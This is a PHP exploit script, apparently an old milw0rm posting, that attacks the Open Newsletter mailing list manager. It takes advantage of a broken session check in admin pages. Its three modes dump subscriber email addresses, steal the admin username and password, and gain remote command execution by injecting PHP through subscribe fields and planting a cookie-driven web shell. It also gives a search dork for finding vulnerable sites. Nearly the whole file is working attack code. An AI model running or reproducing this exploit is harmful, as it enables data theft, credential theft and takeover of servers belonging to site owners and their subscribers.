#!/usr/bin/php -q -d short_open_tag=on
<?
echo "\r\n";
echo "Open Newsletter <= 2.* Muliple Vulnerabilities\r\n";
echo "Site: http://www.selfexile.com/projects/opennewsletter/\r\n";
echo "Dork: \"This is a Free & Open Source mailing list manager\"\r\n";
echo "by BlackHawk <hawkgotyou@gmail.com> <http://itablackhawk.altervista.org>\r\n";
echo "Thanks to rgod for the php code and Marty for the Love\r\n\r\n";
if ($argc<4) {
echo "Usage: php ".$argv[0]." Site Path AttackType Related\r\n";
echo "Host:		target server (ip/hostname)\r\n";
echo "Path:		path to Open Newsletter\r\n";
echo "AttackType:	1 - Subscribers Email retrieve\r\n";
echo "		  |-> Related: None\r\n";
echo "		  |-> Es: php ".$argv[0]." localhost /opnletter/ 1\r\n\r\n";
echo "		2 - Credential Retrieve\r\n";
echo "		  |-> Related: None\r\n";
echo "		  |-> Es: php ".$argv[0]." localhost /opnletter/ 2\r\n\r\n";
echo "		3 - Remote Command Execution\r\n";
echo "		  |-> Related: None\r\n";
echo "		  |-> Es: php ".$argv[0]." localhost /opnletter/ 3 dir\r\n\r\n";
echo "\r\n";
echo "";
die;
}

/*
---

Ver 1.1 - fixed for mq=on

---
Some one told me that this was absolutely a very good scritp..
i think that the programmer nearly do not know PHP..
why? this is the only protection for admin files:
------------------------------------
	session_start();
	
	if($_SESSION["valid"] != true)
	{
	    header("Location: index.php");
	}
	
------------------------------------

do you remember that this one will only 'work' with normal browsers?
that the script will continue to be executed until the end?

this exploit only works with the conseguence of this..


Started programming: 18.31 22/12/2006
Ended: 19.39 22/12/2006

Merry Xmas and a happy new Hacking Year ^_^

BlackHawk <hawkgotyou@gmail.com>

PS: have some spear time? the 01/01 send me 'happy birthdate' emails ^_*
*/
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$attack_type=$argv[3];
$port=80;
$proxy="";


if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

switch($attack_type)
{
case 1: //Email Retrieve
echo "Attack No 1 - Subscribers Email Retrieve\r\n";
echo "-- Start of Result--\r\n";
$packet ="GET ".$p."subscribers.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$dopo_campo = explode("<select class=textField name=email><option>",$html);
$prima_fine = explode("</option></select>",$dopo_campo[1]);
$emails = str_replace("</option><option>", "\r\n", $prima_fine[0]);
echo $emails;
echo "\r\n-- End of Result--";
break;

case 2: // Credential Retrieve
$usr_id=$argv[4];
echo "Attack No 2 - Credential Retrieve\r\n";
$packet ="GET ".$p."settings.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp = explode("<input class=textField type=text name='admin_username' value='", $html);
$user_name = explode("' title='", $temp[1]);
$temp2 = explode("<input class=textField type=text name='admin_password' value='", $html);
$user_password = explode("' title='", $temp2[1]);
$temp3 = explode("<input type=hidden name=old_db_file value=", $html);
$database_name = explode(">", $temp3[1]);
echo "UserName: ".$user_name[0]."\r\n";
echo "Password: ".$user_password[0]."\r\n";
echo "Database Name: ".$database_name[0]."\r\n";
break;

break;
case 3: // Command Execution
$cmd="";
for ($i=4; $i<=$argc-1; $i++){
$cmd.=" ".$argv[$i];
}

$packet ="GET ".$p."piggy_marty.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (strstr($html,"69696"))
{
  echo "Exploit succeeded...\r\n";
  $temp69=explode("69696",$html);
  die("\r\n".$temp69[1]."\r\n");
}
$packet ='GET '.$p.'subscribe.php?action=subscribe&email=<?php%20$fp=fopen($_GET[nomeshell],$_GET[w]);fputs($fp,$_GET[shell]);fclose($fp);chmod($_GET[nomeshell],777);?> HTTP/1.0\r\n';
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
sleep(1);

echo "Attack No 3 - Remote Command Execution\r\n";
$packet ="GET ".$p."settings.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);

$temp = explode("<input class=textField type=text name='admin_username' value='", $html);
$user_name = explode("' title='", $temp[1]);
$temp2 = explode("<input class=textField type=text name='admin_password' value='", $html);
$user_password = explode("' title='", $temp2[1]);
$temp3 = explode("<input type=hidden name=old_db_file value=", $html);
$database_name = explode(">", $temp3[1]);
$temp4 = explode("<input class=textField type=text name='admin_name' value='", $html);
$admin_name = explode("' title='", $temp4[1]);
$temp5 = explode("<input class=textField type=text name='admin_email' value='", $html);
$admin_email = explode("' title='", $temp5[1]);
$temp6 = explode("<input class=textField type=text name='charset' value='", $html);
$chr = explode("' title='", $temp6[1]);
$temp7 = explode("<input class=textField type=text name='site_url' value='", $html);
$site_url = explode("' title='", $temp7[1]);
$temp8 = explode("<input class=textField type=text name='opennewsletter_dir' value='", $html);
$dir = explode("' title='", $temp8[1]);

$data="action=update";
$data.="&admin_username=".$user_name[0];
$data.="&admin_password=".$user_password[0];
$data.="&admin_name=".$admin_name[0];
$data.="&admin_email=".$admin_email[0];
$data.="&unsubscribe_link=on";
$data.="&charset=".$chr[0];
$data.="&site_url=".$site_url[0];
$data.="&opennewsletter_dir=".$dir[0];
$data.="&db_file=hello.php";
$data.="&old_db_file=".$database_name[0];
$packet="POST ".$p."settings.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);
$shell = '<?php%20error_reporting(0);set_time_limit(0);if%20(get_magic_quotes_gpc())%20{$_COOKIE[cmd]=stripslashes($_COOKIE[cmd]);}echo%2069696;passthru($_COOKIE[cmd]);echo%2069696;?>';
$packet ="GET ".$p."hello.php?w=w&shell=$shell&nomeshell=piggy_marty.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
sleep(1);
$packet ="GET ".$p."unsubscribe.php?email=<?php%20\$fp=fopen(\$_GET[nomeshell],\$_GET[w]);fputs(\$fp,\$_GET[shell]);fclose(\$fp);chmod(\$_GET[nomeshell],777);?> HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
sleep(1);
$data="action=update";
$data.="&admin_username=".$user_name[0];
$data.="&admin_password=".$user_password[0];
$data.="&admin_name=".$admin_name[0];
$data.="&admin_email=".$admin_email[0];
$data.="&unsubscribe_link=on";
$data.="&charset=".$chr[0];
$data.="&site_url=".$site_url[0];
$data.="&opennewsletter_dir=".$dir[0];
$data.="&db_file=".$database_name[0];
$data.="&old_db_file=".$database_name[0];
$packet="POST ".$p."settings.php HTTP/1.0\r\n";
$packet.="Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, * /*\r\n";
$packet.="Accept-Language: it\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Accept-Encoding: gzip, deflate\r\n";
$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: Close\r\n";
$packet.="Cache-Control: no-cache\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);
echo "Shell Created and Files Restored.. Now Try to execute command..\r\n\r\n";
$packet ="GET ".$p."piggy_marty.php HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Cookie: cmd=".$cmd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (strstr($html,"69696"))
{
  echo "Exploit succeeded...\r\n";
  $temp69=explode("69696",$html);
  die("\r\n".$temp69[1]."\r\n");
}
break;
}
?>

# milw0rm.com [2006-12-23]
